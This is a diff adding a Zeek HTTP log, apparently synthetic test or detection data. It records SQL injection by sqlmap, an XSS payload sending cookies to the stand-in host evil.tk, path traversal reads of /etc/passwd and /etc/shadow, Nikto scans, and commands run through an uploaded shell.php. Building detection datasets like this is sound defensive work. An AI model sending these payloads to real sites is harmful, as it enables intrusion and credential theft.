@@ -1,0 +1,27 @@
+#separator \x09
+#set_separator	,
+#empty_field	(empty)
+#unset_field	-
+#path	http
+#open	2026-03-01-09-00-00
+#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	trans_depth	method	host	uri	referrer	version	user_agent	origin	request_body_len	response_body_len	status_code	status_msg	info_code	info_msg	tags	username	password	proxied	orig_fuids	orig_filenames	orig_mime_types	resp_fuids	resp_filenames	resp_mime_types
+#types	time	string	addr	port	addr	port	count	string	string	string	string	string	string	string	count	count	count	string	count	string	set[enum]	string	string	vector[string]	vector[string]	vector[string]	vector[string]	vector[string]	vector[string]	vector[string]
+1740823200.000000	HSQLI01	192.168.1.105	51300	10.0.0.1	80	1	GET	target-webapp.local	/search?q=1'+union+select+1,2,3,user(),5--	-	1.1	sqlmap/1.7.8#stable (https://sqlmap.org)	-	0	1240	200	OK	0	-	-	-	-	-	-	-	-	-	-	-
+1740823200.500000	HSQLI02	192.168.1.105	51301	10.0.0.1	80	1	POST	target-webapp.local	/login	-	1.1	sqlmap/1.7.8#stable (https://sqlmap.org)	-	48	0	500	Internal Server Error	0	-	-	-	-	-	-	-	-	-	-	-
+1740823201.000000	HSQLI03	192.168.1.105	51302	10.0.0.1	80	1	GET	target-webapp.local	/user?id=1'+AND+1=1--	-	1.1	sqlmap/1.7.8#stable (https://sqlmap.org)	-	0	2048	200	OK	0	-	-	-	-	-	-	-	-	-	-	-
+1740823201.500000	HSQLI04	192.168.1.105	51303	10.0.0.1	80	1	GET	target-webapp.local	/products?cat=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL--	-	1.1	sqlmap/1.7.8#stable (https://sqlmap.org)	-	0	1890	200	OK	0	-	-	-	-	-	-	-	-	-	-	-
+1740823210.000000	HXSS001	192.168.1.106	51400	10.0.0.1	80	1	GET	target-webapp.local	/comment?text=<script>document.location='http://evil.tk/?c='+document.cookie</script>	-	1.1	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36	-	0	980	200	OK	0	-	-	-	-	-	-	-	-	-	-	-
+1740823210.500000	HXSS002	192.168.1.106	51401	10.0.0.1	80	1	POST	target-webapp.local	/feedback	-	1.1	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36	-	124	340	200	OK	0	-	-	-	-	-	-	-	-	-	-	-
+1740823220.000000	HTRAVERS01	192.168.1.107	51500	10.0.0.1	80	1	GET	target-webapp.local	/download?file=../../../etc/passwd	-	1.1	curl/7.68.0	-	0	1847	200	OK	0	-	-	-	-	-	-	-	-	-	-	-
+1740823220.500000	HTRAVERS02	192.168.1.107	51501	10.0.0.1	80	1	GET	target-webapp.local	/view?path=..%2F..%2F..%2Fetc%2Fshadow	-	1.1	curl/7.68.0	-	0	0	403	Forbidden	0	-	-	-	-	-	-	-	-	-	-	-
+1740823230.000000	HNIKTO01	192.168.1.105	51600	10.0.0.1	80	1	GET	target-webapp.local	/	-	1.1	Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)	-	0	2840	200	OK	0	-	-	-	-	-	-	-	-	-	-	-
+1740823230.200000	HNIKTO02	192.168.1.105	51601	10.0.0.1	80	1	GET	target-webapp.local	/phpinfo.php	-	1.1	Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000001)	-	0	0	404	Not Found	0	-	-	-	-	-	-	-	-	-	-	-
+1740823230.400000	HNIKTO03	192.168.1.105	51602	10.0.0.1	80	1	GET	target-webapp.local	/admin/	-	1.1	Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000002)	-	0	0	401	Unauthorized	0	-	-	-	-	-	-	-	-	-	-	-
+1740823230.600000	HNIKTO04	192.168.1.105	51603	10.0.0.1	80	1	GET	target-webapp.local	/backup.zip	-	1.1	Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000003)	-	0	0	404	Not Found	0	-	-	-	-	-	-	-	-	-	-	-
+1740823240.000000	HCMD001	192.168.1.109	51700	10.0.0.1	80	1	POST	target-webapp.local	/upload.php	-	1.1	python-requests/2.28.0	-	2048	480	200	OK	0	-	-	-	-	-	-	-	-	-	-	-
+1740823240.500000	HCMD002	192.168.1.109	51701	10.0.0.1	80	1	GET	target-webapp.local	/uploads/shell.php?cmd=id	-	1.1	python-requests/2.28.0	-	0	24	200	OK	0	-	-	-	-	-	-	-	-	-	-	-
+1740823241.000000	HCMD003	192.168.1.109	51702	10.0.0.1	80	1	GET	target-webapp.local	/uploads/shell.php?cmd=whoami	-	1.1	python-requests/2.28.0	-	0	8	200	OK	0	-	-	-	-	-	-	-	-	-	-	-
+1740823241.500000	HCMD004	192.168.1.109	51703	10.0.0.1	80	1	GET	target-webapp.local	/uploads/shell.php?cmd=cat+/etc/passwd	-	1.1	python-requests/2.28.0	-	0	1847	200	OK	0	-	-	-	-	-	-	-	-	-	-	-
+1740824000.000000	HLEG001	192.168.1.100	52100	142.250.80.46	443	1	GET	www.google.com	/	-	1.1	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0	-	0	18420	200	OK	0	-	-	-	-	-	-	-	-	-	-	-
+1740824001.000000	HLEG002	192.168.1.101	52101	20.190.151.131	443	1	GET	www.microsoft.com	/en-us/	-	1.1	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0	-	0	24840	200	OK	0	-	-	-	-	-	-	-	-	-	-	-
+#close	2026-03-01-10-00-00
